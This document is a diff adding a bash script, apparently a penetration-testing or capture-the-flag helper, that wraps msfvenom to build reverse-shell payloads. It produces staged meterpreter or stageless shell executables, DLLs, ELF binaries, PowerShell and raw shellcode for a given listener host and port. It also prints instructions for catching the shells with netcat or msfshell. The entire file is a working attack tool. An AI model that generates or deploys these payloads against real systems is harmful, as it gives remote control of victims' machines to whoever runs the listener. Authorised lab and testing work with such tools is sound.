@@ -1,0 +1,118 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+OUTDIR="./payloads"
+
+usage() {
+    echo -e "${RED}Usage: genpayload <lhost> <lport> [platform] [--shell]${NC}"
+    echo -e "${RED}  Ex:  genpayload 10.10.14.5 4444${NC}"
+    echo -e "${RED}  Ex:  genpayload 10.10.14.5 4444 linux${NC}"
+    echo -e "${RED}  Ex:  genpayload 10.10.14.5 4444 --shell${NC}"
+    echo -e "${RED}  Ex:  genpayload 10.10.14.5 4444 linux --shell${NC}"
+    echo ""
+    echo -e "${BLUE}  Platforms: windows (default), linux, exe, dll, ps1${NC}"
+    echo -e "${BLUE}  --shell   → stageless, catch with: nc -lvnp <port>${NC}"
+    echo -e "${BLUE}  (default) → staged meterpreter, catch with: msfshell${NC}"
+    exit 1
+}
+
+[ "$#" -lt 2 ] && usage
+
+LHOST="$1"
+LPORT="$2"
+SHELL_MODE=false
+PLATFORM="windows"
+
+for arg in "${@:3}"; do
+    case "$arg" in
+        --shell) SHELL_MODE=true ;;
+        *)       PLATFORM="$arg" ;;
+    esac
+done
+
+mkdir -p "$OUTDIR"
+
+gen() {
+    local payload="$1"
+    local format="$2"
+    local outfile="$3"
+    echo -e "${BLUE}[*] Generating $outfile...${NC}"
+    msfvenom -p "$payload" LHOST="$LHOST" LPORT="$LPORT" -f "$format" -o "$OUTDIR/$outfile" 2>/dev/null
+    if [ -f "$OUTDIR/$outfile" ]; then
+        SIZE=$(du -h "$OUTDIR/$outfile" | cut -f1)
+        echo -e "${GREEN}[+] $OUTDIR/$outfile ($SIZE)${NC}"
+    else
+        echo -e "${RED}[-] Failed: $outfile${NC}"
+    fi
+}
+
+echo ""
+echo -e "${YELLOW}== Generating Payloads ==${NC}"
+echo -e "${CYAN}LHOST: $LHOST | LPORT: $LPORT${NC}"
+echo -e "${CYAN}Output: $OUTDIR/${NC}"
+if [ "$SHELL_MODE" = true ]; then
+    echo -e "${CYAN}Type:   stageless (nc-compatible)${NC}"
+else
+    echo -e "${CYAN}Type:   staged meterpreter${NC}"
+fi
+echo ""
+
+if [ "$SHELL_MODE" = true ]; then
+    case "$PLATFORM" in
+        windows|win|exe)
+            gen "windows/x64/shell_reverse_tcp" "exe" "shell_nc.exe"
+            gen "windows/x64/shell_reverse_tcp" "dll" "shell_nc.dll"
+            ;;
+        linux)
+            gen "linux/x64/shell_reverse_tcp" "elf" "shell_nc.elf"
+            ;;
+        dll)
+            gen "windows/x64/shell_reverse_tcp" "dll" "shell_nc.dll"
+            ;;
+        *)
+            echo -e "${RED}Unknown platform: $PLATFORM${NC}"
+            usage
+            ;;
+    esac
+else
+    case "$PLATFORM" in
+        windows|win)
+            gen "windows/x64/meterpreter/reverse_tcp" "exe" "shell.exe"
+            gen "windows/x64/meterpreter/reverse_tcp" "dll" "shell.dll"
+            gen "windows/x64/meterpreter/reverse_tcp" "ps1" "shell.ps1"
+            gen "windows/x64/meterpreter/reverse_tcp" "raw" "shell.bin"
+            ;;
+        linux)
+            gen "linux/x64/meterpreter/reverse_tcp" "elf" "shell.elf"
+            gen "linux/x64/meterpreter/reverse_tcp" "raw" "shell.bin"
+            ;;
+        exe)
+            gen "windows/x64/meterpreter/reverse_tcp" "exe" "shell.exe"
+            ;;
+        dll)
+            gen "windows/x64/meterpreter/reverse_tcp" "dll" "shell.dll"
+            ;;
+        ps1)
+            gen "windows/x64/meterpreter/reverse_tcp" "ps1" "shell.ps1"
+            ;;
+        *)
+            echo -e "${RED}Unknown platform: $PLATFORM${NC}"
+            usage
+            ;;
+    esac
+fi
+
+echo ""
+echo -e "${YELLOW}== Done ==${NC}"
+if [ "$SHELL_MODE" = true ]; then
+    echo -e "${BLUE}Catch: rlwrap nc -lvnp $LPORT${NC}"
+else
+    echo -e "${BLUE}Catch: msfshell $LHOST $LPORT${NC}"
+fi
+echo -e "${YELLOW}=================================${NC}"
